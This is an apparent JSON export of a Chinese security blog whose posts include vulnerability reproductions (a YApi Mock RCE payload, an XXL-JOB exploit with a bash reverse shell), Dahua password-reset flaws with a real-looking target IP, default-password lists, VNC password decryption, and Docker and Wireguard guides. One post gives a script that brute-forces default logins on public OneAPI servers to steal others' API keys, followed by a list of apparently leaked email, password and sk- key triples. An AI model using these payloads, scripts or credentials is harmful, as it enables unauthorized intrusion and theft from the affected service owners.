{"posts":[{"title":"云计算电子取证常用思路","content":" 镜像转换 从阿里云拖回来的镜像是raw格式, 要导入VMware则需要转换格式成vmdk, 使用qemu-img转换 qemu-img convert -p -f raw xxxx.raw -O vmdk xxxx.vmdk -p参数可以显示进度 挂载虚拟机 以自定义方式添加虚拟机 兼容性选8.x或者12.x 稍后安装操作系统 系统可以选CentOS 7 64位 网络类型选择NAT(如果不能上网则修改为桥接并且复制物理网络状态) SCSI控制器不用修改 虚拟磁盘类型一定要修改为IDE否则不能正常开机 磁盘选择现有虚拟磁盘即刚刚转换完格式的 保留现有虚拟磁盘格式 内存处理器按照实际情况增加 配置完毕即可开机 重置密码 完成了挂载虚拟机后一般就可以正常开机了, 但是没有root密码, 需要重置密码 将磁盘挂载到一台Linux虚拟机中 root权限打开磁盘, 没有root权限不能读写文件 打开/etc/shadow, 找到root用户那一行, 清空密码root::::, 一般是第二段加密部分 到目前为止root用户的密码已经被清空, 可以直接登录 关闭cloud-init 完成了重置密码后一般就可以进入系统了, 但是, 由于系统从云环境拖下来, 一般会执行云厂商的脚本,例如阿里云会开机访问100.100.100.200获取一些信息, 系统脱离云环境无法访问成功, 可以修改脚本中地址100.100.100.200替换为的代理地址, 或者直接关闭掉cloud-init 将磁盘挂载到一台Linux虚拟机中 root权限打开磁盘 找到/etc/cloud目录 新建一个cloud-init.disabled文件: touch cloud-init.disabled 此时开机则不会指定脚本, 不用等待即可进入系统 未完待续 ","link":"https://flyd.uk/post/cloud-forensics/"},{"title":"YApi远程命令执行","content":"API接口管理平台是国内某旅行网站的大前端技术中心开源项目，使用mock数据/脚本作为中间交互层，为前端后台开发与测试人员提供更优雅的接口管理服务，该系统被国内较多知名互联网企业所采用。 YApi 是高效、易用、功能强大的 api 管理平台。但因为大量用户使用 YAPI的默认配置并允许从外部网络访问 YApi服务，导致攻击者注册用户后，即可通过 Mock功能远程执行任意代码。 漏洞复现 使用Vulfocus搭建的靶机 注册一个账户，并创建一个接口 高级Mock中填写如下脚本 const ObjectConstructor = this.constructor const FunctionConstructor = ObjectConstructor.constructor const myfun = FunctionConstructor('return process') const process = myfun() mockJson = process.mainModule.require(&quot;child_process&quot;).execSync(&quot;ls /tmp&quot;).toString() 访问接口发现命令被成功执行，得到flag ","link":"https://flyd.uk/post/yapi-rce/"},{"title":"XXL-JOB远程命令执行","content":"XXL-JOB是一个轻量级分布式任务调度平台，用于实现大规模任务的调度和执行。 先前版本的XXL-JOB默认情况下API接口没有配置认证措施，现已加入accessToken，但公网仍然有大量使用默认token的机器。未授权的攻击者可构造恶意请求，触发反序列化，造成远程执行命令，直接控制服务器。 老版本复现 老版本没有添加header中的token认证，可以直接RCE 使用Vulfocus提供的靶场环境，flag位于/tmp目录下 攻击机nc监听8888端口nc -lvn 8888 靶机执行/bin/bash -i &gt;&amp; /dev/tcp/172.17.0.1/8888 0&gt;&amp;1反弹shell 根据文档给出的执行器API，构造如下请求 成功反弹shell，执行命令获取flag 文档地址 https://www.xuxueli.com/xxl-job/ 说明：触发任务执行 ------ 地址格式：{执行器内嵌服务根地址}/run Header： XXL-JOB-ACCESS-TOKEN : {请求令牌} 请求数据格式如下，放置在 RequestBody 中，JSON格式： { &quot;jobId&quot;:1, // 任务ID &quot;executorHandler&quot;:&quot;demoJobHandler&quot;, // 任务标识 &quot;executorParams&quot;:&quot;demoJobHandler&quot;, // 任务参数 &quot;executorBlockStrategy&quot;:&quot;COVER_EARLY&quot;, // 任务阻塞策略，可选值参考 com.xxl.job.core.enums.ExecutorBlockStrategyEnum &quot;executorTimeout&quot;:0, // 任务超时时间，单位秒，大于零时生效 &quot;logId&quot;:1, // 本次调度日志ID &quot;logDateTime&quot;:1586629003729, // 本次调度日志时间 &quot;glueType&quot;:&quot;BEAN&quot;, // 任务模式，可选值参考 com.xxl.job.core.glue.GlueTypeEnum &quot;glueSource&quot;:&quot;xxx&quot;, // GLUE脚本代码 &quot;glueUpdatetime&quot;:1586629003727, // GLUE脚本更新时间，用于判定脚本是否变更以及是否需要刷新 &quot;broadcastIndex&quot;:0, // 分片参数：当前分片 &quot;broadcastTotal&quot;:0 // 分片参数：总分片 } 响应数据格式： { &quot;code&quot;: 200, // 200 表示正常、其他失败 &quot;msg&quot;: null // 错误提示消息 } 默认token 配置文件位于/xxl-job-admin/src/main/resources/application.properties 默认token的值xxl.job.accessToken=default_token 在老版基础上添加一个XXL-JOB-ACCESS-TOKEN: default_token的header即可实现RCE PoC 老版PoC, 需要自行修改代码添加header: https://github.com/mrknow001/xxl-job-rce ","link":"https://flyd.uk/post/xxl-job-rce/"},{"title":"大华PoC","content":"CNVD-2021-26090 | CNVD-2022-44216 | CNVD-2023-40905 | CNVD-2022-76275 | CNVD-2021-51924 | CNVD-2022-38178 | DVB-2023-4908 https://github.com/xiaoWangSec/DaHuaPoC/ CNVD-2021-51924 DSS逻辑漏洞，复现步骤：以用户名system密码随意登陆系统，密码错误并显示忘记密码选项，点击忘记密码，密保问题全部填1，存在漏洞则会进入修改密码界面。 详情可以参考之前的文章：CNVD-2021-51924 大华DSS平台逻辑漏洞 CNVD-2022-76275 DSS配置系统逻辑漏洞，复现步骤：以用户名admin密码随意登陆配置系统，密码错误并显示忘记密码选项，点击忘记密码，密保问题全部填1，存在漏洞则会进入修改密码界面。 详情可以参考之前的文章：CNVD-2022-76275 大华DSS平台配置系统逻辑漏洞 CNVD-2021-26090 CNVD-2022-44216 CNVD-2022-38178 ICC逻辑漏洞，三个编号对应调用的接口完全相同，仅UI不同。 复现步骤：点击忘记密码，输入用户名system密码随意，密保问题全1，存在漏洞则会进入修改密码界面。 CNVD-2023-40905 ICC配置系统逻辑漏洞。 复现步骤：点击忘记密码，输入用户名admin密码随意，密保问题全1，存在漏洞则会进入修改密码界面。 DVB-2023-4908 ICC逻辑漏洞，可以使用用户名justForTest和任意密码登录ICC系统。 https://github.com/xiaoWangSec/DaHuaPoC/ ","link":"https://flyd.uk/post/DaHuaPoC/"},{"title":"白嫖OpenAPI APIKEY思路","content":" 思路一: 猜邮箱 找一些卖Key的发卡网站, 在订单查询中猜其他人购买的邮箱 https://eylink.cn/ https://nbfaka.com/ds/ 常见的弱邮箱: 123456@qq.com 123@qq.com 1@qq.com 123123@qq.com 666@qq.com 888@qq.com 1@1.com 1@1.1 思路二: 爆破弱口令 爆破别人搭建好的OneAPI弱口令, OneAPI是OpenAI 接口管理 &amp; 分发系统, 默认搭建完成后用户名是root密码是123456, 很多人部署到公网后不会修改默认密码, 所以可以直接爆破白嫖别人的APIKEY 项目地址: https://github.com/songquanpeng/one-api 可以使用OneAPI这个关键字在测绘引擎查找别人部署在公网的示例, 然后将IP或者URL保存在url.txt中, 即可自动爆破 一种爆破代码示例: import requests import urllib3.contrib.pyopenssl urllib3.contrib.pyopenssl.inject_into_urllib3() urls = [] def get_url(): with open('url.txt', 'r') as f: for line in f: urls.append(line.strip()) return urls def try_login_and_get_token(url): payloads = [{&quot;username&quot;:&quot;root&quot;,&quot;password&quot;:&quot;123456&quot;}, {&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;123456&quot;}, {&quot;username&quot;:&quot;root&quot;,&quot;password&quot;:&quot;root&quot;}, {&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;admin&quot;}, ] headers = {&quot;Content-Type&quot;: &quot;application/json&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36&quot;} session = requests.session() session.headers = headers for payload in payloads: try: if &quot;用户名&quot; in session.post(url + &quot;/api/user/login&quot;, json=payload, timeout=1).text: return else: dta = session.get(url + &quot;/api/token/?p=0&quot;, timeout=1).json()['data'] if len(dta) != 0: print(url) for i in dta: print(&quot;sk-&quot; + i['key']) print() return except: pass if __name__ == '__main__': get_url() for item in urls: try_login_and_get_token(item) API分享 kuoyeshokri4@hotmail.com----sChTPS32----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 u.iy.gf.bf.h.y.ocn.g1.69@gmail.com----ubje^K73n6CO----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 sipkemusodao@hotmail.com----UhxxiR98----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 y.b.b.x.k.tx.c.tej.d.772@gmail.com----Ge^ZZBfio----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 jj.mp.qcyb.o.d.i.w.l.y.08@gmail.com----TrjUp7wxXu^T----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 rg.a.d.g.n.0.32853.128@gmail.com----SJR9GnD!PCkYC----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 bnvexod@outlook.com----ZAQAfas616----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 nqmabqlgf@outlook.com----BSQtd5365----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 lqsgkgdaj@hotmail.com----RCTQsg591----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 vhszley@outlook.com----EREToyy6936----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 uikfrdkjkr@hotmail.com----ZDJmq053----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 ztkdqegb@hotmail.com----JRIUdld76----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 lynenwoconshand@mail.com----NtlHVqfgqd----7KJfPwayx----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 hasillegangti@mail.com----VqumZwcEeQ----cwpeu3ZHA----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 nrecarimneili@mail.com----prXIkKIkTP----jqHqSYYD7----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 coadilytoti@mail.com----RpDOFqltjS----0ydTkz8lc----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 fiddtovederon@mail.com----wQVaMCqrtP----QD5KWxzyR----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 sforlanloaphardist@mail.com----CAJrWQFwWN----tLe1dgbcZ----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 erofelitup@mail.com----DRUxgdhClX----QyR1r39Rc----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 ","link":"https://flyd.uk/post/bai-piao-openapi-apikey-si-lu/"},{"title":"长亭雷池WAF使用教程","content":"记录一下长亭雷池WAF的使用教程 项目地址: https://github.com/chaitin/safeline 安装 安装前需要确保Docker和Compose V2已经安装且以达到版本要求 docker info # &gt;= 20.10.6 docker compose version # &gt;= 2.0.0 如果未安装Compose V2, 可以使用该命令安装sudo apt update &amp;&amp; sudo apt install docker-compose-plugin 依赖安装完成后执行 # 新建文件夹 mkdir -p safeline &amp;&amp; cd safeline # 安装 curl -kfLsS https://waf-ce.chaitin.cn/release/latest/setup.sh | bash # 启动 sudo docker compose up -d 安装完成后可以访问 https://:9443 进行配置, 使用TOTP APP扫码然后登录进去 场景一 其他问题 遇到其他问题可以参考官方FAQ文档 ","link":"https://flyd.uk/post/safeline-guide/"},{"title":"IPv6小鸡利用WARP打造匿名Wireguard","content":" IPv6小鸡 用的是scaleway的星辰主机, 1U1G10G, €0.45一个月 开通命令: scw instance server create type=STARDUST1-S zone=fr-par-1(法国区, 开的位置这里改) image=debian_bullseye(Debian, 你可以自己改) root-volume=l:10G name=scw-now-hertz ip=none project-id=51b4e5be-9xxx-4xxx-bxxx-4fxxxxx(换成你自己的) scw instance server create type=STARDUST1-S zone=nl-ams-1(荷兰区, 开的位置这里改) image=ubuntu_jammy(Ubuntu, 你可以自己改) root-volume=l:10G name=scw-now ip=none project-id=51b4e5be-9xxx-4xxx-bxxx-4fxxxxx(换成你自己的) 命令来源: https://www.lizi.tw/web/22113.html 接入WARP 目的是为了让纯IPv6小鸡拥有IPv4地址, 使得可以用于访问IPv4的站点 命令wget -N --no-check-certificate https://gitlab.com/rwkgyg/CFwarp/raw/main/CFwarp.sh &amp;&amp; bash CFwarp.sh 来源 https://gitlab.com/rwkgyg/CFwarp 或者 wget -N https://raw.githubusercontent.com/dxomg/vpsfreescripts/main/main.sh &amp;&amp; bash main.sh 选择[1] Install Warp to enable Ipv4 on Ipv6 only 注意 建议使用CFwarp.sh脚本, 并且接入你自己的Cloudflared ZeroTrust账户(也就是WARP Teams版账户) 搭建Wireguard前的命令准备 临时写法 echo 1 &gt; /proc/sys/net/ipv4/ip_forward echo 1 &gt; /proc/sys/net/ipv4/conf/all/src_valid_mark echo 0 &gt; /proc/sys/net/ipv6/conf/all/disable_ipv6 echo 1 &gt; /proc/sys/net/ipv6/conf/all/forwarding echo 1 &gt; /proc/sys/net/ipv6/conf/default/forwarding echo 1 &gt; /proc/sys/net/ipv6/conf/all/proxy_ndp 永久生效 echo &quot;net.ipv4.ip_forward = 1&quot; &gt;&gt; /etc/sysctl.conf echo &quot;net.ipv4.conf.all.src_valid_mark = 1&quot; &gt;&gt; /etc/sysctl.conf echo &quot;net.ipv6.conf.all.disable_ipv6 = 0&quot; &gt;&gt; /etc/sysctl.conf echo &quot;net.ipv6.conf.all.forwarding = 1&quot; &gt;&gt; /etc/sysctl.conf echo &quot;net.ipv6.conf.default.forwarding = 1&quot; &gt;&gt; /etc/sysctl.conf echo &quot;net.ipv6.conf.all.proxy_ndp = 1&quot; &gt;&gt; /etc/sysctl.conf 安装Docker 请务必在接入WARP后安装Docker, 否则可能导致无法接入WARP apt-get update &amp;&amp; apt-get install -y docker.io 命令来源Docker常用命令 搭建Wirdguard 需要使用Docker, 请确保已经安装 请修改WG_HOST和PASSWORD字段, 在跑完后访问http://[你的IPv6地址]:51821进入管理界面生成配置文件即可 方法A docker run -d \\ --name=wg-easy \\ -e WG_HOST=[你的IPv6地址] \\ -e PASSWORD=你的密码 \\ -v ~/.wg-easy:/etc/wireguard \\ -p 51820:51820/udp \\ -p 51821:51821/tcp \\ --cap-add=NET_ADMIN \\ --cap-add=SYS_MODULE \\ --privileged=true \\ --sysctl=&quot;net.ipv4.conf.all.src_valid_mark=1&quot; \\ --sysctl=&quot;net.ipv4.ip_forward=1&quot; \\ --sysctl=&quot;net.ipv6.conf.all.disable_ipv6=0&quot; \\ --sysctl=&quot;net.ipv6.conf.all.forwarding=1&quot; \\ --sysctl=&quot;net.ipv6.conf.default.forwarding=1&quot; \\ --sysctl=&quot;net.ipv6.conf.eth0.proxy_ndp=1&quot; \\ --restart unless-stopped \\ weejewel/wg-easy:latest 方法B docker run -d \\ --name=wg-easy \\ -e WG_HOST=[你的IPv6地址] \\ -e PASSWORD=你的密码 \\ -v ~/.wg-easy:/etc/wireguard \\ --network=host \\ --cap-add=NET_ADMIN \\ --cap-add=SYS_MODULE \\ --privileged=true \\ --restart unless-stopped \\ weejewel/wg-easy:latest 转发命令 目的是为了让传入服务器的流量在wg网卡和warp网卡中相互转发, 实现使用warp IP访问 方法A 需要转发两次, 重启失效 eth0为Docker容器里的网卡, wg0为Wireguard在容器里面的接入网卡 docker0为物理机docker网卡, WARP为可出网网卡 转发顺序是从wg0转发到eth0, 在从docker0(也就是eth0)转发到WARP Docker内转发 (似乎不是必要, 如果无法上网再尝试) 首先进入容器命令docker exec -it wg-easy /bin/bash iptables -A FORWARD -i wg0 -o eth0 -j ACCEPT iptables -A FORWARD -i eth0 -o wg0 -m state --state ESTABLISHED,RELATED -j ACCEPT iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE 完成后按Ctrl + D退出容器 Docker转发到WARP (似乎不是必要, 如果无法上网再尝试) iptables -A FORWARD -i docker0 -o WARP -j ACCEPT iptables -A FORWARD -i WARP -o docker0 -m state --state ESTABLISHED,RELATED -j ACCEPT iptables -t nat -A POSTROUTING -o WARP -j MASQUERADE 方法B 只需要转发一次, 重启失效 wg0为不可上网网卡, WARP为可出网网卡 wg0转发到WARP iptables -A FORWARD -i wg0 -o WARP -j ACCEPT iptables -A FORWARD -i WARP -o wg0 -m state --state ESTABLISHED,RELATED -j ACCEPT iptables -t nat -A POSTROUTING -o WARP -j MASQUERADE 转发命令参考https://serverfault.com/questions/431593/iptables-forwarding-between-two-interface Wireguard使用 在完成上述操作后, 访问http://[你的IPv6地址]:51821进入管理界面生成配置文件, 导入到客户端后即可开始使用 实际演示 接入WARP -&gt; wget -N --no-check-certificate https://gitlab.com/rwkgyg/CFwarp/raw/main/CFwarp.sh &amp;&amp; bash CFwarp.sh -&gt; 1. 方案一：安装/切换WARP-GO -&gt; 3. 安装/切换WARP双栈IPV4+IPV6 此时提示成功, 可以 curl -4 IP.sb 以及 curl -6 ip.sb 查看效果 如果需要接入你的Teams账户, 则继续 -&gt; cf -&gt; 7. WARP三类账户升级/切换(WARP/WARP+/WARP Teams) -&gt; 3. WARP Teams (Zero Trust)团队账户（无限流量） -&gt; 进入显示的网页按提示操作以获取Token -&gt; 填入Token 安装Docker -&gt; apt-get update &amp;&amp; apt-get install -y docker.io 配置转发 echo &quot;net.ipv4.ip_forward = 1&quot; &gt;&gt; /etc/sysctl.conf echo &quot;net.ipv4.conf.all.src_valid_mark = 1&quot; &gt;&gt; /etc/sysctl.conf echo &quot;net.ipv6.conf.all.disable_ipv6 = 0&quot; &gt;&gt; /etc/sysctl.conf echo &quot;net.ipv6.conf.all.forwarding = 1&quot; &gt;&gt; /etc/sysctl.conf echo &quot;net.ipv6.conf.default.forwarding = 1&quot; &gt;&gt; /etc/sysctl.conf echo &quot;net.ipv6.conf.all.proxy_ndp = 1&quot; &gt;&gt; /etc/sysctl.conf 安装Wireguard docker run -d \\ --name=wg-easy \\ -e WG_HOST=[你的IPv6地址] \\ -e PASSWORD=你的密码 \\ -v ~/.wg-easy:/etc/wireguard \\ --network=host \\ --cap-add=NET_ADMIN \\ --cap-add=SYS_MODULE \\ --privileged=true \\ --restart unless-stopped \\ weejewel/wg-easy:latest 配置网卡转发 由于是方法B, 所以选择对应的转发命令 iptables -A FORWARD -i wg0 -o WARP -j ACCEPT iptables -A FORWARD -i WARP -o wg0 -m state --state ESTABLISHED,RELATED -j ACCEPT iptables -t nat -A POSTROUTING -o WARP -j MASQUERADE 下载配置文件 访问http://[你的IP]:51821进入管理界面并登录 注意 根据Cloudflared设定, 使用WARP访问接入了Cloudflared的页面使用的是你原有的IP地址, 所以当你用本文介绍的方法配置的Wireguard访问这类站点时, 使用的IP是你小鸡的IP 例如: ip.sb 和 ipw.cn得到的IP不通 ","link":"https://flyd.uk/post/ipv6-wg/"},{"title":"一些弱口令","content":"记录一些弱口令 Smart Gateway Zhuhai Pilot Technology Co., Ltd Username: root Password: pilot_zh CloudAI &amp; BCA-WEB Username: admin Password: admin 可直接访问/main.html?Level=Root绕过 Face++旷视智能企业解决方案 北京旷视科技有限公司 Username: admin@megvii.com Password: 123456 联想智能云教室VNC密码 默认开VNC 密码文件位置: .\\联想智能云教室客户端\\TightVNCDef.reg --&gt; Password字段 Password: 3907112 CourseGrading 希冀平台VNC密码 Password: vncpassw ","link":"https://flyd.uk/post/weakPwd/"},{"title":"CNVD-2022-76275 大华DSS平台配置系统逻辑漏洞","content":"浙江大华技术股份有限公司是领先的监控产品供应商和解决方案服务商。 浙江大华技术股份有限公司DSS配置系统存在逻辑缺陷漏洞，攻击者可利用该漏洞重置配置系统密码，获取敏感信息。 该漏洞复现方式类似于CNVD-2021-51924，只不过本漏洞针对配置系统（http(s)://IP:PORT/config）。 DSS系统存在逻辑缺陷，对于未设置配置系统密保问题的DSS配置系统，攻击者可任意填写密保问题答案从而重置配置系统密码，进而重置DSS系统密码，获取摄像头管理权限。 复现过程 http(s)://IP:PORT/config/user_toLoginPage.action 打开连接后随意输入用户名和密码，点击登录，提示用户名或密码错误，并且出现忘了密码选项，单击忘了密码： 此界面随便输入问题答案，并提交： 发现已经转跳到修改密码的界面 修改密码后成功登录后台，并且可以修改DSS系统密码 ","link":"https://flyd.uk/post/cnvd-2022-76275/"},{"title":"CNVD-2021-51924 大华DSS平台逻辑漏洞","content":"浙江大华技术股份有限公司是领先的监控产品供应商和解决方案服务商。 浙江大华技术股份有限公司DSS存在逻辑缺陷漏洞，攻击者可利用该漏洞重置系统密码，获取敏感信息。 大华DSS系统存在逻辑缺陷，在DSS登陆界面处，对于未设置密保问题的system用户，攻击者可填写密保问题答案全1从而实现重置system用户密码，进而获取系统最高权限，获取摄像头管理权限。 该漏洞被记录为CNVD-2021-51924 实战复现 美国佛州某DSS: https://170.55.62.104/admin/login_login.action 打开后为DSS的登陆界面，用户名输入system，密码随便输入 点击登陆后会弹出密码错误，并且下方出现“忘记密码”，点击进入 在弹出的找回密码界面，所有问题答案均输入1，即可成功进入密码重置界面 ","link":"https://flyd.uk/post/CNVD-2021-51924/"},{"title":"CourseGrading 希冀平台VNC密码","content":"希冀是开放、可扩展的信息类专业教学、实验与科研一体化平台。该平台会在32770端口开VNC服务，32771端口为noVNC服务。本文记录一下破解该VNC密码的过程。 通过查看进程，可以得知学生实验机都开了VNC。 搜索该脚本所在位置 root@cg:~/Desktop# find / -name &quot;vnc_startup.sh&quot; /dockerstartup/vnc_startup.sh 进一步查看脚本内容 root@cg:~/Desktop# cat /dockerstartup/vnc_startup.sh #!/bin/bash ### every exit != 0 fails the script set -e ## print out help help (){ echo &quot; USAGE: docker run -it -p 6901:6901 -p 5901:5901 consol/&lt;image&gt;:&lt;tag&gt; &lt;option&gt; IMAGES: consol/ubuntu-xfce-vnc consol/centos-xfce-vnc consol/ubuntu-icewm-vnc consol/centos-icewm-vnc TAGS: latest stable version of branch 'master' dev current development version of branch 'dev' OPTIONS: -w, --wait (default) keeps the UI and the vncserver up until SIGINT or SIGTERM will received -s, --skip skip the vnc startup and just execute the assigned command. example: docker run consol/centos-xfce-vnc --skip bash -d, --debug enables more detailed startup output e.g. 'docker run consol/centos-xfce-vnc --debug bash' -h, --help print out this help Fore more information see: https://github.com/ConSol/docker-headless-vnc-container &quot; } if [[ $1 =~ -h|--help ]]; then help exit 0 fi # should also source $STARTUPDIR/generate_container_user source $HOME/.bashrc # add `--skip` to startup args, to skip the VNC startup procedure if [[ $1 =~ -s|--skip ]]; then echo -e &quot;\\n\\n------------------ SKIP VNC STARTUP -----------------&quot; echo -e &quot;\\n\\n------------------ EXECUTE COMMAND ------------------&quot; echo &quot;Executing command: '${@:2}'&quot; exec &quot;${@:2}&quot; fi if [[ $1 =~ -d|--debug ]]; then echo -e &quot;\\n\\n------------------ DEBUG VNC STARTUP -----------------&quot; export DEBUG=true fi ## correct forwarding of shutdown signal cleanup () { kill -s SIGTERM $! exit 0 } trap cleanup SIGINT SIGTERM ## write correct window size to chrome properties $STARTUPDIR/chrome-init.sh ## resolve_vnc_connection VNC_IP=$(hostname -i) ## change vnc password echo -e &quot;\\n------------------ change VNC password ------------------&quot; # first entry is control, second is view (if only one is valid for both) mkdir -p &quot;$HOME/.vnc&quot; PASSWD_PATH=&quot;$HOME/.vnc/passwd&quot; if [[ -f $PASSWD_PATH ]]; then echo -e &quot;\\n--------- purging existing VNC password settings ---------&quot; rm -f $PASSWD_PATH fi if [[ $VNC_VIEW_ONLY == &quot;true&quot; ]]; then echo &quot;start VNC server in VIEW ONLY mode!&quot; #create random pw to prevent access echo $(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 20) | vncpasswd -f &gt; $PASSWD_PATH fi echo &quot;$VNC_PW&quot; | vncpasswd -f &gt;&gt; $PASSWD_PATH chmod 600 $PASSWD_PATH ## start vncserver and noVNC webclient echo -e &quot;\\n------------------ start noVNC ----------------------------&quot; if [[ $DEBUG == true ]]; then echo &quot;$NO_VNC_HOME/utils/launch.sh --vnc localhost:$VNC_PORT --listen $NO_VNC_PORT&quot;; fi $NO_VNC_HOME/utils/launch.sh --vnc localhost:$VNC_PORT --listen $NO_VNC_PORT &amp;&gt; $STARTUPDIR/no_vnc_startup.log &amp; PID_SUB=$! echo -e &quot;\\n------------------ start VNC server ------------------------&quot; echo &quot;remove old vnc locks to be a reattachable container&quot; vncserver -kill $DISPLAY &amp;&gt; $STARTUPDIR/vnc_startup.log \\ || rm -rfv /tmp/.X*-lock /tmp/.X11-unix &amp;&gt; $STARTUPDIR/vnc_startup.log \\ || echo &quot;no locks present&quot; echo -e &quot;start vncserver with param: VNC_COL_DEPTH=$VNC_COL_DEPTH, VNC_RESOLUTION=$VNC_RESOLUTION\\n...&quot; if [[ $DEBUG == true ]]; then echo &quot;vncserver $DISPLAY -depth $VNC_COL_DEPTH -geometry $VNC_RESOLUTION&quot;; fi vncserver $DISPLAY -depth $VNC_COL_DEPTH -geometry $VNC_RESOLUTION &amp;&gt; $STARTUPDIR/no_vnc_startup.log echo -e &quot;start window manager\\n...&quot; $HOME/wm_startup.sh &amp;&gt; $STARTUPDIR/wm_startup.log ## log connect options echo -e &quot;\\n\\n------------------ VNC environment started ------------------&quot; echo -e &quot;\\nVNCSERVER started on DISPLAY= $DISPLAY \\n\\t=&gt; connect via VNC viewer with $VNC_IP:$VNC_PORT&quot; echo -e &quot;\\nnoVNC HTML client started:\\n\\t=&gt; connect via http://$VNC_IP:$NO_VNC_PORT/?password=...\\n&quot; if [[ $DEBUG == true ]] || [[ $1 =~ -t|--tail-log ]]; then echo -e &quot;\\n------------------ $HOME/.vnc/*$DISPLAY.log ------------------&quot; # if option `-t` or `--tail-log` block the execution and tail the VNC log tail -f $STARTUPDIR/*.log $HOME/.vnc/*$DISPLAY.log fi if [ -z &quot;$1&quot; ] || [[ $1 =~ -w|--wait ]]; then wait $PID_SUB else # unknown option ==&gt; call command echo -e &quot;\\n\\n------------------ EXECUTE COMMAND ------------------&quot; echo &quot;Executing command: '$@'&quot; exec &quot;$@&quot; fi 很乱，但是可以看到里面有/.vnc/passwd字段，推测就是密码存放位置。 最终在/headless/.vnc/passwd目录下找到了密码文件，密码是通过DES-CBC-NoPadding加密后的 Key为e84ad660c4721ae0，IV为0000000000000000。 可以去开一台makefile的学生机进行编译，免去了环境配置时间。 https://github.com/jeroennijhof/vncpwd root@cg:~/Desktop# make &amp;&amp; chmod +x ./vncpwd &amp;&amp; ./vncpwd /headless/.vnc/passwd Password: vncpassw https://github.com/billchaison/VNCDecrypt root@cg:~/Desktop# echo -n 40CCA9718FFB8E91 | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d -provider legacy -provider default | hexdump -Cv 00000000 76 6e 63 70 61 73 73 77 |vncpassw| 00000008 得到密码: vncpassw，该密码为所有学生机VNC密码，也为平台在32770的VNC服务的密码。 ","link":"https://flyd.uk/post/cg-vncpwd/"},{"title":"CVE-2023-24249","content":"laravel-admin is administrative interface builder for laravel which can help you build CRUD backends just with few lines of code. There is a problem in larravel-admin that allows attackers to bypass file upload restrictions, and attackers can upload files in *. php format for remote code execution. Suggested description An arbitrary file upload vulnerability in laravel-admin v1.8.19 allows attackers to execute arbitrary code via a crafted PHP file. VulnerabilityType Other File Upload Vendor of Product https://github.com/z-song/laravel-admin Affected Product Code Base laravel-admin - v1.8.19 Affected Component There is a problem in larravel-admin that allows attackers to bypass file upload restrictions, and attackers can upload files in *. php format for remote code execution. Attack Type Remote Impact Code execution true Details After logging in to the larravel-admin background, going to the “user settings” (“用户设置”) interface, try to modify the user’s avatar and save it, and then capture the requested data packet. You can try to upload a php file ending in. jpg extended Try to modify avatar Upload .jpg file After the upload is successful, replay the request and modify the file name of the file upload to “. php”. e.g.: php.jpg.php Replay the request Upload succeeded Refresh the user setting interface, prompt that the upload was successful, and you can get the address of the php file below. PHP file is executed The vulnerability affects the latest version of laravel-admin (v1.8.19). Others CVE ID: CVE-2023-24249 Github: https://github.com/z-song/laravel-admin Official website: https://laravel-admin.org/ Issues page: https://github.com/z-song/laravel-admin/issues/5726 ","link":"https://flyd.uk/post/cve-2023-24249/"},{"title":"Docker常用命令","content":"记录一下折腾Docker时用到的一些常用命令 Docker 安装 apt-get update &amp;&amp; apt-get install -y docker.io 或者 curl -sSL https://get.daocloud.io/docker | sh service docker start 换源 vi /etc/docker/daemon.json 键入以下内容并保存 { &quot;registry-mirrors&quot; : [ &quot;https://registry.docker-cn.com&quot;, &quot;http://hub-mirror.c.163.com&quot;, &quot;https://docker.mirrors.ustc.edu.cn&quot;, &quot;https://cr.console.aliyun.com&quot;, &quot;https://mirror.ccs.tencentyun.com&quot; ] } systemctl daemon-reload systemctl restart docker.service 查看镜像 docker images 搜索镜像 docker search 镜像名 拉取镜像 docker pull 镜像名 docker pull 镜像名:Tag 删除镜像 docker rmi -f 镜像名 docker rmi -f 镜像ID 保存镜像 docker save 镜像名/镜像ID -o 保存位置和名字 加载镜像 docker load -i 镜像位置 查看容器 docker ps #正在运行的容器 docker ps -a #所有容器 创建容器 docker run -it -d --name 别名 -p 宿主机端口:容器端口 -v 宿主机路径:容器路径 镜像名:Tag /bin/bash -it: 交互式启动 -d: 可后台运行 --name: 别名 -p: 将端口映射到宿主机, 前面的是宿主机端口, 后面的是容器端口 -v: 将文件夹挂载到容器, 前面的是宿主机路径, 后面的事容器路径 /bin/bash: 交互路径 --restart: 重启策略, 可选参数: no, no-failure, on-failure:3, always, unless-stopped no: 容器退出时不重启 on-failure: 容器非正常退出时才重启 on-failure:3: 容器非正常退出时才重启, 最多3次 always: 总是重启 unless-stopped: 容器退出时总是重启容器, 但是不考虑先前已经被停止的 停止容器 docker stop 容器名/容器ID 删除容器 docker rm -f 容器名/容器ID docker rm -f 容器名/容器ID 容器名/容器ID 容器名/容器ID docker rm -f $(docker ps -aq) 连接容器 docker attach 容器名/容器ID 修改参数 docker container update --restart=always 在容器中执行命令 docker exec -it 容器名/容器ID /bin/bash ","link":"https://flyd.uk/post/docker-command/"},{"title":"Hello Gridea","content":"👏 欢迎使用 Gridea ！ ✍️ Gridea 一个静态博客写作客户端。你可以用它来记录你的生活、心情、知识、笔记、创意... ... Github Gridea 主页 示例网站 特性👇 📝 你可以使用最酷的 Markdown 语法，进行快速创作 🌉 你可以给文章配上精美的封面图和在文章任意位置插入图片 🏷️ 你可以对文章进行标签分组 📋 你可以自定义菜单，甚至可以创建外部链接菜单 💻 你可以在 Windows，MacOS 或 Linux 设备上使用此客户端 🌎 你可以使用 𝖦𝗂𝗍𝗁𝗎𝖻 𝖯𝖺𝗀𝖾𝗌 或 Coding Pages 向世界展示，未来将支持更多平台 💬 你可以进行简单的配置，接入 Gitalk 或 DisqusJS 评论系统 🇬🇧 你可以使用中文简体或英语 🌁 你可以任意使用应用内默认主题或任意第三方主题，强大的主题自定义能力 🖥 你可以自定义源文件夹，利用 OneDrive、百度网盘、iCloud、Dropbox 等进行多设备同步 🌱 当然 Gridea 还很年轻，有很多不足，但请相信，它会不停向前 🏃 未来，它一定会成为你离不开的伙伴 尽情发挥你的才华吧！ 😘 Enjoy~ ","link":"https://flyd.uk/post/hello-gridea/"}]}